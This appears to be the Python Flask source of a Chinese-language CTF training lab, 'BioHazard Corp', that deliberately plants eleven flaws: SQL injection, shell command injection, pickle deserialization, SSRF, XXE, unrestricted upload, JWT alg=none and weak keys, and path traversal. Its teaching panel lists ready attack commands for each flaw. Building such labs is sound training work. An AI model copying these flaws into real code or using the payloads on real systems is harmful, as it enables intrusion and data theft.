#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
============================================================
 BIOHAZARD CTF LAB v2 — 「生化公司」漏洞靶场 (超集)
============================================================
 剧情: 你是一名白帽雇佣兵, 接悬赏入侵"生化公司"内网。
 目标: 从 Web 入口一路打通到内网域控, 收集全部 flag。

 漏洞清单 (仅限本地靶场/CTF学习):
   S1 调试接口信息泄露       /debug_info          -> flag#1
   S2 SQL 注入绕过登录       /login               -> flag#2
   S3 源码泄露/弱密钥        /source /api/routes  -> 密钥
   S4 SSRF                   /api/fetch           -> flag#3
   S5 命令注入               /api/ping            -> RCE
   S6 pickle 反序列化        /api/deserialize     -> RCE
   S7 内网横向移动(域控)     /api/fetch->dc       -> flag#4
   S8 任意文件上传+目录浏览  /api/upload          -> flag#5
   S9 XXE                    /api/parse_xml       -> flag#6
   S10 JWT 弱密钥伪造        /api/jwt/*           -> flag#7
   S11 目录穿越              /api/download        -> flag#8

 可视化教学面板: /lab   (攻击链图谱 + 进度追踪 + 一键命令)
============================================================
"""
import os
import base64
import json
import pickle
import sqlite3
import subprocess
import threading
import hmac
import hashlib
import time

from flask import Flask, request, session, redirect, jsonify, Response
from lxml import etree

# ================= 配置 =================
# 💀 故意硬编码的弱密钥 (视频同款)
SECRET_KEY = "Th1s_1s_N0t_Th3_Rea1_K3y"

MYSQL_HOST = os.environ.get("MYSQL_HOST", "")   # 留空 = SQLite 本地模式
MYSQL_USER = os.environ.get("MYSQL_USER", "corp_app")
MYSQL_PASS = os.environ.get("MYSQL_PASS", "CorpApp@2026")
MYSQL_DB   = os.environ.get("MYSQL_DB", "corp")

APP_DIR    = os.path.dirname(os.path.abspath(__file__))
UPLOAD_DIR = os.path.join(APP_DIR, "uploads")
DATA_DIR   = os.path.join(APP_DIR, "data")
os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(DATA_DIR, exist_ok=True)

# ================= Flag 定义 =================
def _read_flag(name, default):
    p = os.path.join(APP_DIR, name)
    return open(p).read().strip() if os.path.exists(p) else default

FLAGS = {
    "flag1": "flag{0pen_D3bug_1s_D4ng3r0us}",
    "flag2": None,   # 数据库读取
    "flag3": "flag{B4ckup_0f_Th3_Und3ad}",
    "flag4": "flag{D0m41n_C0ntr0ll3r_0wn3d}",
    "flag5": "flag{Unr3str1ct3d_Upl04d}",
    "flag6": _read_flag("flag6_xxe.txt", "flag{Xx3_1s_D4ng3r0us}"),
    "flag7": _read_flag("flag7_jwt.txt",  "flag{Jwt_S3cr3t_T00_W34k}"),
    "flag8": _read_flag("flag8_traversal.txt", "flag{Tr4v3rs4l_K1ll5_T4rget}"),
}

# JWT 弱密钥 (S10 的教学点: 爆破/伪造)
JWT_SECRET = "super_secret_key_123"

# ================= 进度追踪 =================
PROGRESS_FILE = os.environ.get("PROGRESS_FILE", "/tmp/progress.json")
_lock = threading.Lock()

def _load_progress():
    try:
        with open(PROGRESS_FILE) as f:
            return json.load(f)
    except Exception:
        return {}

def _save_progress(p):
    with open(PROGRESS_FILE, "w") as f:
        json.dump(p, f)

def mark_flag(flag_id):
    with _lock:
        p = _load_progress()
        p[flag_id] = {"time": time.strftime("%H:%M:%S"), "ts": time.time()}
        _save_progress(p)

def get_progress():
    return _load_progress()

# ================= Flask 应用 =================
APP = Flask(__name__)
APP.secret_key = SECRET_KEY
APP.config["MAX_CONTENT_LENGTH"] = 4 * 1024 * 1024

# ================= 数据库 (MySQL / SQLite 双兼容) =================
def _conn():
    if MYSQL_HOST:
        import pymysql
        return pymysql.connect(host=MYSQL_HOST, user=MYSQL_USER,
                               password=MYSQL_PASS, database=MYSQL_DB,
                               charset="utf8mb4", cursorclass=pymysql.cursors.DictCursor)
    c = sqlite3.connect("/tmp/corp.db")
    c.row_factory = sqlite3.Row
    return c

def db_init():
    c = _conn()
    cur = c.cursor()
    if not MYSQL_HOST:
        cur.execute("DROP TABLE IF EXISTS users")
        cur.execute("DROP TABLE IF EXISTS flags")
    if MYSQL_HOST:  # MySQL 方言
        cur.execute("""CREATE TABLE IF NOT EXISTS users(
            id INT PRIMARY KEY AUTO_INCREMENT,
            username VARCHAR(64), password VARCHAR(64), role VARCHAR(16))""")
        cur.execute("""CREATE TABLE IF NOT EXISTS flags(
            id INT PRIMARY KEY AUTO_INCREMENT, name VARCHAR(64), value VARCHAR(128))""")
        cur.execute("DELETE FROM users")
        cur.execute("DELETE FROM flags")
    else:           # SQLite 本地模式
        cur.execute("""CREATE TABLE IF NOT EXISTS users(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT, password TEXT, role TEXT)""")
        cur.execute("""CREATE TABLE IF NOT EXISTS flags(
            id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, value TEXT)""")
    cur.execute("INSERT INTO users(username,password,role) VALUES('admin','admin@123','admin')")
    cur.execute("INSERT INTO users(username,password,role) VALUES('guest','guest123','user')")
    cur.execute("INSERT INTO flags(name,value) VALUES('flag2_db','flag{C0ngr4ts_Y0u_R34d_DB}')")
    c.commit()
    c.close()

def db_query(sql):
    """⚠️ 故意不做任何过滤 —— 这里就是 SQL 注入漏洞点"""
    c = _conn()
    try:
        cur = c.cursor()
        cur.execute(sql)
        rows = cur.fetchall()
        c.commit()
        return rows
    finally:
        c.close()

# ================= 页面 =================
HOME = """
<h2>🏢 生化公司 官方网站</h2>
<p>欢迎访问 BioHazard Corp. 官方网站。</p>
<p>🔗 <a href='/login'>员工登录</a> · <a href='/admin'>内部后台</a> · <a href='/source'>源码</a> · <a href='/lab'>🎓 教学面板</a></p>
<p>📄 <a href='/robots.txt'>robots.txt</a></p>
<hr><small>CTF 教学靶场 · 仅供学习 · 请勿用于真实系统</small>
"""

LOGIN = """
<h2>员工登录</h2>
<form method='POST'>
  用户名: <input name='username'><br>
  密码: <input name='password' type='password'><br>
  <button>登录</button>
</form>
"""

@APP.route("/")
def index():
    return HOME

@APP.route("/robots.txt")
def robots():
    body = ("User-agent: *\n"
            "Disallow: /login\n"
            "Disallow: /debug_info\n"
            "Disallow: /admin\n"
            "Disallow: /source\n"
            "# hint: 管理员默认密码很弱, 且登录接口可能存在注入")
    return Response(body, mimetype="text/plain")

# ================= S1: 调试接口信息泄露 → flag#1 =================
@APP.route("/debug_info")
def debug_info():
    mark_flag("s1")
    info = {
        "app": "BioHazard Corp Web Portal v2.0",
        "framework": "Flask",
        "flag1": FLAGS["flag1"],
        "mysql_host": (MYSQL_HOST or "127.0.0.1") + ":3306",
        "internal_subnet": os.environ.get("INTERNAL_SUBNET", "172.20.0.0/24"),
        "note": "调试接口忘了关, 建议尽快下线 :)"
    }
    return jsonify(info)

# ================= S2: SQL 注入绕过登录 =================
@APP.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        return LOGIN
    user = request.form.get("username", "")
    pwd = request.form.get("password", "")
    # 💀 漏洞: 直接字符串拼接 SQL
    sql = f"SELECT username, role FROM users WHERE username='{user}' AND password='{pwd}'"
    rows = db_query(sql)
    if rows:
        r = rows[0]
        session["username"] = r["username"]
        session["role"] = r["role"]
        mark_flag("s2")
        return redirect("/admin")
    return "<p style='color:red'>登录失败</p><a href='/login'>重试</a>"

# ================= S3: /admin 后台 → flag#2 =================
@APP.route("/admin")
def admin():
    if session.get("role") != "admin":
        return "<p style='color:red'>⛔ 权限不足, 需要 admin 角色</p><a href='/login'>去登录</a>", 403
    rows = db_query("SELECT name, value FROM flags")
    flag2 = next((r["value"] for r in rows if "flag2" in r["name"]), "")
    return f"""
<h2>🖥️ 内部后台</h2>
<p>欢迎回来, <b>{session.get('username')}</b> — 角色: {session.get('role')}</p>
<p>📊 今日销售额: $1,000,000+ </p>
<p>🗄️ 数据库中的机密:</p>
<pre style='background:#111;color:#0f0;padding:10px'>{flag2}</pre>
<hr><small>你是否好奇这个 cookie 里装了什么? 试试 decode 一下 session cookie</small>
"""

# ================= S3.5: 源码泄露 → 弱密钥 =================
@APP.route("/source")
def source():
    with open(__file__, "r", encoding="utf-8") as f:
        return Response("<pre>" + f.read().replace("<", "&lt;") + "</pre>",
                        mimetype="text/html")

@APP.route("/api/routes")
def api_routes():
    routes = sorted({str(r) for r in APP.url_map.iter_rules() if "static" not in str(r)})
    return jsonify({"routes": routes,
                    "hint": "枚举路由可以发现隐藏功能点, 包括 /api/fetch /api/ping /api/deserialize /api/upload /api/parse_xml /api/jwt /api/download"})

# ================= S4: SSRF → 内网 backup 服务 =================
@APP.route("/api/fetch", methods=["GET"])
def api_fetch():
    url = request.args.get("url", "")
    if not url:
        return jsonify({"error": "缺少 url 参数", "example": "/api/fetch?url=http://backup:8080/"})
    import requests
    try:
        r = requests.get(url, timeout=4)
        if "text" in r.headers.get("Content-Type", ""):
            body = r.text[:3000]
            if "flag{B4ckup" in body:
                mark_flag("s4")
            return Response(body, mimetype="text/plain")
        return jsonify({"base64": base64.b64encode(r.content[:1000]).decode(), "size": len(r.content)})
    except Exception as e:
        return jsonify({"error": str(e)})

# ================= S5: 命令注入 =================
@APP.route("/api/ping", methods=["GET"])
def api_ping():
    ip = request.args.get("ip", "")
    if not ip:
        return jsonify({"error": "缺少 ip 参数", "example": "/api/ping?ip=127.0.0.1",
                        "hint": "试试 ';id' 看看会发生什么"})
    cmd = f"ping -c 1 {ip}"
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,
                                      timeout=5).decode(errors="ignore")
        if "uid=" in out or "id=" in out:
            mark_flag("s5")
        return Response(out, mimetype="text/plain")
    except subprocess.TimeoutExpired:
        return Response("timeout", mimetype="text/plain")
    except Exception as e:
        return Response(str(e), mimetype="text/plain")

# ================= S6: pickle 反序列化 → RCE =================
@APP.route("/api/deserialize", methods=["POST"])
def api_deserialize():
    try:
        data = request.form.get("data", "")
        obj = pickle.loads(base64.b64decode(data))
        mark_flag("s6")
        return jsonify({"unpickled": str(obj)[:500]})
    except Exception as e:
        return jsonify({"error": str(e)})


# ============ S8: 任意文件上传 + 目录浏览 → flag#5 ============
UPLOAD_FORM = """
<h2>📤 文件上传中心</h2>
<p>请上传您的文件 (仅支持图片)... 大概吧</p>
<form method='POST' enctype='multipart/form-data'>
  <input type='file' name='file'><br><button>上传</button>
</form>
<p>👉 上传后到 <a href='/uploads/'>/uploads/</a> 查看</p>
"""

@APP.route("/uploads/", methods=["GET"])
def upload_list():
    mark_flag("s8_visit")
    try:
        files = sorted(os.listdir(UPLOAD_DIR))
    except Exception as e:
        files = [str(e)]
    html = "<h2>📂 上传目录</h2><ul>"
    for f in files:
        html += f"<li><a href='/uploads/{f}'>{f}</a></li>"
    html += "</ul><small>提示: 咦, 这里怎么有奇怪的文件?</small>"
    return html

@APP.route("/uploads/<path:name>", methods=["GET"])
def upload_file(name):
    safe = os.path.basename(name)   # 兜底: 读取时防穿越 (上传时的漏洞才是重点)
    path = os.path.join(UPLOAD_DIR, safe)
    if not os.path.exists(path):
        return "404 not found", 404
    body = open(path, "rb").read()
    if b"flag{Unr3str1ct3d" in body:
        mark_flag("s8")
    return Response(body, mimetype="application/octet-stream")

@APP.route("/api/upload", methods=["GET", "POST"])
def api_upload():
    if request.method == "GET":
        return UPLOAD_FORM
    f = request.files.get("file")
    if not f or not f.filename:
        return "<p style='color:red'>没有选择文件</p>", 400
    # 💀 漏洞: 文件名原样保存! (不校验后缀/内容, 不随机重命名)
    filename = os.path.basename(f.filename)
    f.save(os.path.join(UPLOAD_DIR, filename))
    return f"<p>✅ 上传成功: /uploads/{filename}</p><a href='/uploads/'>查看目录</a>"

# ============ S9: XXE → flag#6 ============
@APP.route("/api/parse_xml", methods=["GET", "POST"])
def api_parse_xml():
    if request.method == "GET":
        return """
<h2>📄 XML解析服务</h2>
<p>提交 XML 文档, 服务端解析并提取 name 字段。</p>
<form method='POST'>
  <textarea name='xml' rows='6' cols='60'>&lt;?xml version="1.0"?&gt;
&lt;root&gt;&lt;name&gt;hello&lt;/name&gt;&lt;/root&gt;</textarea><br>
  <button>解析</button>
</form>
"""
    xml = request.form.get("xml", "")
    if not xml:
        return "缺少 xml 参数", 400
    # 💀 漏洞: lxml 解析外部实体 (XXE)
    try:
        parser = etree.XMLParser(no_network=False, resolve_entities=True, load_dtd=True)
        root = etree.fromstring(xml.encode(), parser=parser)
        name = root.findtext("name") if root.find("name") is not None else etree.tostring(root, encoding="unicode")
        if "flag{Xx3" in str(name):
            mark_flag("s9")
        return f"<pre>解析结果: {name}</pre>"
    except Exception as e:
        return f"<pre style='color:red'>解析失败: {e}</pre>", 400

# ============ S10: JWT 弱密钥 → flag#7 ============
def _b64u(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def _b64u_decode(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def jwt_sign(payload, secret):
    header = {"alg": "HS256", "typ": "JWT"}
    seg = _b64u(json.dumps(header)) + "." + _b64u(json.dumps(payload))
    sig = _b64u(hmac.new(secret.encode(), seg.encode(), hashlib.sha256).digest())
    return seg + "." + sig

def jwt_verify(token):
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("格式错误")
    header = json.loads(_b64u_decode(parts[0]))
    payload = json.loads(_b64u_decode(parts[1]))
    if str(header.get("alg", "")).lower() == "none":
        # 💀 漏洞1: alg=none 直接信任
        return payload
    seg = parts[0] + "." + parts[1]
    expect = _b64u(hmac.new(JWT_SECRET.encode(), seg.encode(), hashlib.sha256).digest())
    if not hmac.compare_digest(expect, parts[2]):
        raise ValueError("签名无效")
    return payload

@APP.route("/api/jwt/token")
def jwt_token():
    token = jwt_sign({"user": "guest", "role": "user", "exp": int(time.time()) + 3600}, JWT_SECRET)
    return jsonify({"token": token, "hint": "试试解码这个JWT, 然后把 role 改成 admin"})

@APP.route("/api/jwt/data")
def jwt_data():
    auth = request.headers.get("Authorization", "")
    token = auth.replace("Bearer ", "").strip()
    try:
        payload = jwt_verify(token)
    except Exception as e:
        return jsonify({"error": f"JWT 验证失败: {e}"}), 401
    if payload.get("role") == "admin":
        mark_flag("s10")
        return jsonify({"message": "欢迎, 管理员!", "secret": FLAGS["flag7"]})
    return jsonify({"message": "普通用户, 无权限", "your_role": payload.get("role")}), 403

# ============ S11: 目录穿越 → flag#8 ============
@APP.route("/api/download", methods=["GET"])
def api_download():
    fn = request.args.get("file", "")
    if not fn:
        return jsonify({"error": "缺少 file 参数", "example": "/api/download?file=data/note.txt",
                        "hint": "试试 ../../flag8_traversal.txt"})
    # 💀 漏洞: 直接拼接路径, 未过滤 ../
    path = os.path.join(DATA_DIR, fn)
    try:
        with open(path, "rb") as f:
            body = f.read()
        if b"flag{Tr4v3rs4l" in body:
            mark_flag("s11")
        return Response(body, mimetype="application/octet-stream")
    except Exception as e:
        return str(e), 400

# ================= S7 辅助: 内网扫描提示 =================
@APP.route("/api/nmap", methods=["GET"])
def api_nmap_hint():
    mark_flag("s7_scan")
    return jsonify({
        "message": "从 web 容器视角扫描内网 (提示: 172.20.0.0/24)",
        "targets": ["172.20.0.20 (mysql)", "172.20.0.30 (backup)", "172.20.0.40 (dc)"],
        "hint": "拿到域控凭据后访问 http://dc:389/auth?user=..&pass=.. (可通过 /api/fetch 转跳)"
    })

# ================= 教学面板 /lab + API =================
LAB_META = [
    {"id": "s1",  "num": 1,  "name": "信息收集",   "tech": "调试接口泄露",    "flag": "flag#1",
     "desc": "扫描端口, 目录爆破, 找到遗忘的调试接口",
     "cmd": "curl http://<靶机>/debug_info"},
    {"id": "s2",  "num": 2,  "name": "登录绕过",   "tech": "SQL 注入",        "flag": "flag#2",
     "desc": "登录框存在SQL注入, 万能密码绕过",
     "cmd": "curl -c c.txt -X POST -d \"username=' OR '1'='1'-- &password=x\" http://<靶机>/login"},
    {"id": "s3",  "num": 3,  "name": "密钥窃取",   "tech": "源码泄露",        "flag": "—",
     "desc": "打开 /source 找硬编码 SECRET_KEY, 用于伪造管理员cookie",
     "cmd": "curl http://<靶机>/source | grep SECRET_KEY"},
    {"id": "s4",  "num": 4,  "name": "内网跳板",   "tech": "SSRF",            "flag": "flag#3",
     "desc": "用 /api/fetch 访问内网 backup 服务, 拿备份和域控凭据",
     "cmd": "curl \"http://<靶机>/api/fetch?url=http://backup:8080/archives/core_backup.txt\""},
    {"id": "s5",  "num": 5,  "name": "命令执行",   "tech": "命令注入",        "flag": "—",
     "desc": "/api/ping 参数拼接进shell, 注入额外命令",
     "cmd": "curl \"http://<靶机>/api/ping?ip=127.0.0.1;id\""},
    {"id": "s6",  "num": 6,  "name": "远程代码执行", "tech": "pickle反序列化", "flag": "—",
     "desc": "/api/deserialize 直接 pickle.loads 用户输入",
     "cmd": "python3 scripts/solvers/gen_pickle.py"},
    {"id": "s7",  "num": 7,  "name": "域控沦陷",   "tech": "横向移动",        "flag": "flag#4",
     "desc": "用偷来的域控账号对 dc 认证",
     "cmd": "curl \"http://<靶机>/api/fetch?url=http://dc:389/auth?user=svc_dc&pass=S3rv1c3_P@ss!_2026\""},
    {"id": "s8",  "num": 8,  "name": "上传后门",   "tech": "任意文件上传",    "flag": "flag#5",
     "desc": "上传接口不校验文件, 目录可浏览, 翻出隐藏flag",
     "cmd": "curl -F 'file=@x.txt' http://<靶机>/api/upload && curl http://<靶机>/uploads/"},
    {"id": "s9",  "num": 9,  "name": "XML炸弹",    "tech": "XXE",             "flag": "flag#6",
     "desc": "XML解析服务未禁用外部实体, 读取服务器文件",
     "cmd": "curl -d 'xml=<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///app/flag6_xxe.txt\">]><r><name>&x;</name></r>' http://<靶机>/api/parse_xml"},
    {"id": "s10", "num": 10, "name": "假令牌",     "tech": "JWT弱密钥",       "flag": "flag#7",
     "desc": "JWT 密钥太弱, 解码后伪造 admin 角色",
     "cmd": "请求 /api/jwt/token 拿令牌, 解码改 role=admin 重签后访问 /api/jwt/data"},
    {"id": "s11", "num": 11, "name": "目录穿越",   "tech": "路径穿越",        "flag": "flag#8",
     "desc": "下载接口未过滤 ../, 可读取任意文件",
     "cmd": "curl \"http://<靶机>/api/download?file=../../flag8_traversal.txt\""},
]

@APP.route("/lab")
def lab():
    html = open(os.path.join(APP_DIR, "lab.html"), encoding="utf-8").read()
    return Response(html, mimetype="text/html")

@APP.route("/api/lab_meta")
def lab_meta():
    return jsonify({"stages": LAB_META})

@APP.route("/api/progress")
def progress_api():
    p = get_progress()
    total = sum(1 for m in LAB_META if m["flag"].startswith("flag"))
    done = sum(1 for m in LAB_META if m["id"] in p and m["flag"].startswith("flag"))
    return jsonify({"progress": p, "total_flags": total, "done_flags": done,
                    "stage_order": [m["id"] for m in LAB_META]})

# ================= 启动 =================
def main():
    db_init()
    print(f"* BioHazard CTF Lab v2 启动 (DB={'MySQL' if MYSQL_HOST else 'SQLite'})")
    print(f"* 教学面板: http://localhost:{os.environ.get('PORT', 80)}/lab")
    APP.run(host="0.0.0.0", port=int(os.environ.get("PORT", 80)), debug=False)

if __name__ == "__main__":
    main()
